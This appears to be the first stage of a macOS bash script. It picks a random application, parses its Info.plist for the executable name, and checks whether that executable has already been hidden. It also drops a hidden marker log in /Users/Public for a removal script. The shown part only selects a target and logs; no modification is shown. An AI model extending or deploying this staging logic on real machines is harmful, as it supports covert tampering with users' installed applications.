#!/bin/bash
#Stage 1, re-written:
DEBUG=1
#DEBUG has to be enabled (1) for LOGGING to be enabled (1)
LOGGING=1
#Do not run this script in /Users/Public/, as the logging would mess with the log
#for removal.sh
Path=$(pwd)
if [ -f ./.stage-1.log ] && [ ${Path} != "/Users/Public/" ] && [ ${LOGGING} == 1 ]
then
	echo "" >> ./.stage-1.log
fi
if [ ${Path} == "/Users/Public" ] && [ ${LOGGING} == 1 ]
then
	if [ ${DEBUG} == 1 ]
	then
		echo "Unable to run in ${Path} with LOGGING set to ${LOGGING}"
		echo "This is to protect the integrity of the log used for removal of stage 1"
	fi
	exit 0
fi
Script=$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )$0
if [ ${DEBUG} == 1 ]
then
	echo "Script is ${Script}"
	if [ ${LOGGING} == 1 ]
	then
		echo "Script is ${Script}" >> ./.stage-1.log
	fi
fi
#It appears that some plists are gibberish for some reason, they can be identified 
#by ${ExecLineNum} having a value of 1 (after let adding one to its value)
IsReadablePlist="false"
IsAlreadyPresent="false"
while [ ${IsReadablePlist} == "false" ] && [ ${IsAlreadyPresent} == "false" ] 
do
	#Application roulette; coppied from stage-1-old:
	loc=(/Applications/*)
	Target="${loc[RANDOM % ${#loc[@]}]}"
	TargetPlist="${Target}/Contents/Info.plist"
	if [ ${DEBUG} == 1 ]
	then
		echo "Target is ${Target} and TargetPlist is ${TargetPlist}"
		if [ ${LOGGING} == 1 ]
		then
			echo "Target is ${Target} and TargetPlist is ${TargetPlist}" >> ./.stage-1.log
		fi
	fi
	#Using sed to get the line number where the executable name is stored in the
	#target application's Info.plist (by looking for CFBundleExecutable and then
	#adding 1):
	ExecLineNum=$(sed -n "/CFBundleExecutable/=" "${TargetPlist}")
	let "ExecLineNum++"
	if [ ${DEBUG} == 1 ]
	then
		echo "ExecLineNum is ${ExecLineNum}"
		if [ ${LOGGING} == 1 ]
		then
			echo "ExecLineNum is ${ExecLineNum}" >> ./.stage-1.log
		fi
	fi
	if [ ${ExecLineNum} == 1 ]
	then
		if [ ${DEBUG} == 1 ]
		then
			echo "IsReadablePlist == false"
			if [ ${LOGGING} == 1 ]
			then
				echo "IsReadablePlist == false" >> ./.stage-1.log
			fi
		fi
		IsReadablePlist="false"
	else
		ExecLineFull=$(sed -n "${ExecLineNum}p" "${TargetPlist}")
		TmpName=$RANDOM
		echo "${ExecLineFull}" >> "/private/tmp/${TmpName}"
		ExecName=$(sed -nE "/<string>/ s/.*<string>([^<]+).*/\1/p" "/private/tmp/${TmpName}")
		rm "/private/tmp/${TmpName}"
		if [ ! -f "/private/tmp/${TmpName}" ] && [ ${DEBUG} == 1 ]
		then
			echo "TmpName (${TmpName}) deleted"
			if [ ${LOGGING} == 1 ]
			then
				echo "TmpName (${TmpName}) deleted" >> ./.stage-1.log
			fi
		fi
		#-E after sed is thanks to https://stackoverflow.com/a/28072266/8390381
		if [ ${DEBUG} == 1 ]
		then
			echo "ExecLineFull is ${ExecLineFull}"
			echo "TmpName is ${TmpName}"
			echo "ExecName is ${ExecName}"
			if [ ${LOGGING} == 1 ]
			then
				echo "ExecLineFull is ${ExecLineFull}" >> ./.stage-1.log
				echo "TmpName is ${TmpName}" >> ./.stage-1.log
				echo "ExecName is ${ExecName}" >> ./.stage-1.log
			fi
		fi
		#If ${ExecName} starts with a . (aka is hidden) then repeat this loop
		if [[ ${ExecName} = .* ]]
		then
			if [ ${DEBUG} == 1 ]
			then
				echo "IsAlreadyPresent == true"
				if [ ${LOGGING} == 1 ]
				then
					echo "IsAlreadyPresent == true" >> ./.stage-1.log
				fi
			fi
			IsAlreadyPresent="true"
		fi
		if [ ${DEBUG} == 1 ]
		then
			echo "IsReadablePlist == true"
			if [ ${LOGGING} == 1 ]
			then
				echo "IsReadablePlist == true" >> ./.stage-1.log
			fi
		fi
		IsReadablePlist="true"
	fi
done
#Check for stage 1 log/info file (/Users/Public/.stage-1.log) (all other non-
#commonly-visited [but always present] directories [other than /private/tmp/,
#but that's temporary] require sudo/root perms)
#./.stage-1.log is for logging of the script, and /Users/Public/.stage-1.log
#if for being read by removal.sh
if [ -f /Users/Public/.stage-1.log ]
then
	if [ ${DEBUG} == 1 ]
	then
		echo "/Users/Public/.stage-1.log present"
		if [ ${LOGGING} == 1 ]
		then
			echo "/Users/Public/.stage-1.log present" >> ./.stage-1.log
		fi
	fi
else
	touch "/Users/Public/.stage-1.log"
	if [ ${DEBUG} == 1 ]
	then
		echo "/Users/Public/.stage-1.log not present"
		echo "/Users/Public/.stage-1.log created"
		if [ ${LOGGING} == 1 ]
		then
			echo "/Users/Public/.stage-1.log not present" >> ./.stage-1.log
			echo "/Users/Public/.stage-1.log created" >> ./.stage-1.log
		fi
	fi
fi